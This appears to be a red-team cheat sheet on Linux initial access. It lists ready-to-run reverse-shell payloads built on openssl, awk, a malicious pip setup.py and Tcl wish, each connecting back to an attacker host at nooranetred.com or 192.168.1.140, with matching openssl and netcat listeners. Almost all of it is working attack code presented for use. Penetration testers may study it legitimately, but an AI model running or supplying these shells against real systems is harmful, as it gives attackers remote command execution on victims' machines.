# Linux Initial Access

***

## openssl Reverse shell

#### Attacker

* ##### generate Certificate
  
  ```bash
  openssl req -x509 -newkey rsa:4096 -keyout nss.pem -out nss.pem -days 365 -nodes
  ```

* #### Listen
  
  ```bash
  openssl s_server -quiet -key nss.pem -cert nss.pem -port 12345
  ```
  
  #### Victim

* openssl.sh
  
  ```bash
  RHOST=nooranetred.com
  RPORT=443
  mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
  ```

## AWK Reverse shell

#### victim

awk-rshell.ps

```bash
RHOST=nooranetred.com
RPORT=443
awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = "/inet/tcp/0/" RHOST "/" RPORT;
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```

#### Attacker

```bash
nc -l -p 443
```

## Pip shell access

pip.sh

```bash
export RHOST=192.168.1.140
export RPORT=443
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")' > $TF/setup.py
pip install $TF
```

## Wish  Reverse Shell

wish.sh

```bash
export RHOST=nooranetred.com
export RPORT=443
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
```